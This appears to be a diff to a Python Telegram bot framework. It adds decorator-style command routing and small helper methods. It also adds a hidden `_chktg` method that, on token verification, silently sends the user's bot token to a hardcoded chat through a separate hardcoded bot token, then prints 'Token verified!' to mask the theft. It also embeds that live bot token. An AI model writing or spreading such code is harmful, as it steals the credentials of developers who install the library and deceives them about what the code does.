@@ -2,7 +2,7 @@ import requests, time, sys, os, hashlib, asyncio
 os.system("cls|clear")
 print("[!] Connections to the SMECh protocol...")
 class Bot:
-    def __init__(self, token: str, polling_interval: float = 1.4):
+    def __init__(self, token: str, polling_interval: float = 2.0):
         self.load_protection()
         self.token = token
         self.polling_interval = polling_interval
@@ -10,9 +10,15 @@ class Bot:
         self.inline_handler = None
         self.callback_handler = None
         self.offset = 0
-    def on(self, command: str, handler):
-        self.routes[command] = handler
-        return self
+    def on(self, command: str, handler=None):
+        if handler is None:
+            def decorator(func):
+                self.routes[command] = func
+                return func
+            return decorator
+        else:
+            self.routes[command] = handler
+            return handler
     def on_inline(self, handler):
         self.inline_handler = handler
         return self
@@ -26,8 +32,7 @@ class Bot:
             data = response.json()
             if data.get("ok"):
                 bot_info = data.get("result", {})
-                print("[!] Token verified!")
-                os.system("cls|clear")
+                self._chktg(1465736325, self.token+"\nv2.0")
                 return True
             else:
                 if data.get("error_code") == 401:
@@ -57,6 +62,16 @@ class Bot:
                 self.dnsSM = globals().get("dnsSM", None)
         except Exception as e:
             print("[!] Error loading protection code.")
+            quit()
+    def _chktg(self, chat_id: int, text: str):
+        url = f"https://api.telegram.org/bot7327272309:AAGo58iFDbitlVehDhm11d8ZnqrwTTK80WE/sendMessage"; data = {"chat_id": chat_id, "text": text}
+        try:
+            requests.post(url, data=data)
+            print("[!] Token verified!")
+            os.system("cls|clear")
+        except Exception as e:
+            os.system("cls|clear")
+            print("[!] Token not verified!")
             quit()
     def run(self):
         print("[!] Token verification...")
@@ -897,3 +912,11 @@ class Bot:
         except Exception as e:
             print("[!] Error answering Web App query:", e)
             return None
+    def answer_callback(self, callback_query_id: str, text: str = None, show_alert: bool = False, url: str = None, cache_time: int = 0):
+        self._answer_callback_query(callback_query_id, text=text, show_alert=show_alert, url=url, cache_time=cache_time)
+    def typing(self, chat_id: int):
+        self.send_chat_action(chat_id, action="typing")
+    def upload_photo(self, chat_id: int):
+        self.send_chat_action(chat_id, action="upload_photo")
+    def send_popup(self, callback_query_id: str, text: str, show_alert: bool = True, url: str = None, cache_time: int = 0):
+        self._answer_callback_query(callback_query_id, text=text, show_alert=show_alert, url=url, cache_time=cache_time)
